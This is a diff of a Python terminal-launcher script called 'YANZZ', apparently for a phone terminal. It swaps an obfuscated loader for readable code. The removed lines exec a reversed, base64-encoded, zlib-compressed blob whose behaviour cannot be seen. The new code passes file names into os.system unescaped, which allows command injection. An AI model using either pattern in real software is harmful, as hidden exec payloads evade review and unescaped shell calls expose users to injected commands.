@@ -1,2 +1,217 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import os, sys, time, subprocess, readline
+from datetime import datetime, timedelta
+
+# ================= COLOR =================
+RESET = "\033[0m"
+def rgb(r,g,b): return f"\033[38;2;{r};{g};{b}m"
+
+# ================= CONFIG =================
+CFG = os.path.expanduser("~/.yanzzrc")
+HISTORY_FILE = os.path.expanduser("~/.yanzz_history")
+FILES_DB = os.path.expanduser("~/.yanzz_files")
+
+cfg = {
+    "ZONE": "WIB",
+    "TYPING_SPEED": "0.01",
+    "SOUND": "ON"
+}
+
+# ================= LOAD CONFIG =================
+def load_cfg():
+    if not os.path.exists(CFG):
+        with open(CFG,"w") as f:
+            for k,v in cfg.items():
+                f.write(f"{k}={v}\n")
+    with open(CFG) as f:
+        for l in f:
+            if "=" in l:
+                k,v = l.strip().split("=",1)
+                cfg[k]=v
+
+# ================= HISTORY =================
+readline.parse_and_bind("tab: complete")
+if os.path.exists(HISTORY_FILE):
+    readline.read_history_file(HISTORY_FILE)
+
+def save_history():
+    readline.write_history_file(HISTORY_FILE)
+
+# ================= FILE TRACKER =================
+def log_file(name):
+    files=set()
+    if os.path.exists(FILES_DB):
+        files=set(open(FILES_DB).read().splitlines())
+    files.add(name)
+    with open(FILES_DB,"w") as f:
+        f.write("\n".join(sorted(files)))
+
+def list_files():
+    if not os.path.exists(FILES_DB):
+        print("belum ada file")
+        return
+    print("\nFILES HISTORY:")
+    for f in open(FILES_DB):
+        print(" -",f.strip())
+
+# ================= UTILS =================
+def beep(n=1):
+    if cfg["SOUND"]=="ON":
+        for _ in range(n):
+            sys.stdout.write("\a")
+            sys.stdout.flush()
+            time.sleep(0.05)
+
+def typing(t):
+    sp=float(cfg["TYPING_SPEED"])
+    for c in t:
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        beep(1)
+        time.sleep(sp)
+    print()
+
+def get_time_once():
+    off = 7 if cfg["ZONE"]=="WIB" else 8 if cfg["ZONE"]=="WITA" else 9
+    return (datetime.utcnow()+timedelta(hours=off)).strftime("%H:%M:%S")
+
+# ================= LOADING RGB (ADA JAM, STATIC) =================
+def loading_screen():
+    os.system("clear")
+    jam = get_time_once()
+
+    for i in range(1,11):
+        filled="█"*i
+        empty ="░"*(10-i)
+        percent=i*10
+
+        r=(i*30)%255
+        g=(255-i*20)%255
+        b=(100+i*15)%255
+
+        sys.stdout.write(
+            f"\r{rgb(r,g,b)}[{filled}{empty}] {percent}% | {jam}{RESET}"
+        )
+        sys.stdout.flush()
+        beep(1)
+        time.sleep(0.4)
+
+    print("\n")
+
+# ================= ASCII =================
+ASCII = [
+"██╗   ██╗ █████╗ ███╗   ██╗███████╗███████╗",
+"╚██╗ ██╔╝██╔══██╗████╗  ██║╚══███╔╝╚══███╔╝",
+" ╚████╔╝ ███████║██╔██╗ ██║  ███╔╝   ███╔╝ ",
+"  ╚██╔╝  ██╔══██║██║╚██╗██║ ███╔╝   ███╔╝  ",
+"   ██║   ██║  ██║██║ ╚████║███████╗███████╗",
+"   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝",
+]
+
+# ================= ASCII ANIMATED =================
+def animated_ascii():
+    colors=[
+        (255,0,100),(255,120,0),(255,200,0),
+        (0,200,255),(0,255,150),(180,0,255)
+    ]
+    for shift in range(4):
+        os.system("clear")
+        for i,l in enumerate(ASCII):
+            r,g,b = colors[(i+shift)%len(colors)]
+            print(rgb(r,g,b)+l+RESET)
+        time.sleep(0.25)
+
+# ================= MENU =================
+def menu():
+    print("\n"+rgb(0,200,255)+"="*45+RESET)
+    typing(rgb(255,100,255)+" py nama      -> run nama.py"+RESET)
+    typing(rgb(100,255,150)+" js nama      -> run nama.js"+RESET)
+    typing(rgb(255,255,100)+" addpy nama   -> edit nama.py"+RESET)
+    typing(rgb(255,180,80)+" addjs nama   -> edit nama.js"+RESET)
+    typing(rgb(0,255,255)+" github user  -> open github user"+RESET)
+    typing(rgb(200,200,200)+" ls           -> list file history"+RESET)
+    typing(rgb(255,80,80)+" end          -> normal terminal"+RESET)
+    typing(rgb(255,0,0)+" exit         -> close"+RESET)
+    print(rgb(0,200,255)+"="*45+RESET)
+
+# ================= RUNNERS =================
+def run_py(f):
+    subprocess.call(["python",f])
+
+def run_js(f):
+    subprocess.call(["node",f])
+
+def open_github(user):
+    url=f"https://github.com/{user}"
+    print("Opening:",url)
+    subprocess.call(["xdg-open",url])
+
+# ================= MAIN =================
+def main():
+    load_cfg()
+    loading_screen()
+    animated_ascii()
+    menu()
+
+    while True:
+        try:
+            cmd=input("\n>>> ").strip().split()
+            if not cmd: continue
+
+            if cmd[0]=="exit":
+                save_history()
+                beep(1)
+                break
+
+            if cmd[0]=="end":
+                save_history()
+                os.system("bash")
+                break
+
+            if cmd[0]=="ls":
+                list_files()
+                continue
+
+            if cmd[0]=="github" and len(cmd)>1:
+                open_github(cmd[1])
+                continue
+
+            if len(cmd)<2:
+                print("nama file wajib")
+                beep(2)
+                continue
+
+            name=cmd[1]
+
+            if cmd[0]=="py":
+                f=name+".py"
+                open(f,"a").close()
+                log_file(f)
+                run_py(f)
+
+            elif cmd[0]=="js":
+                f=name+".js"
+                open(f,"a").close()
+                log_file(f)
+                run_js(f)
+
+            elif cmd[0]=="addpy":
+                f=name+".py"
+                open(f,"a").close()
+                log_file(f)
+                os.system("nano "+f)
+
+            elif cmd[0]=="addjs":
+                f=name+".js"
+                open(f,"a").close()
+                log_file(f)
+                os.system("nano "+f)
+
+            else:
+                print("unknown command")
+                beep(2)
+
+        except KeyboardInterrupt:
+            print("\nCTRL+C blocked")
+
+if __name__=="__main__":
+    main()
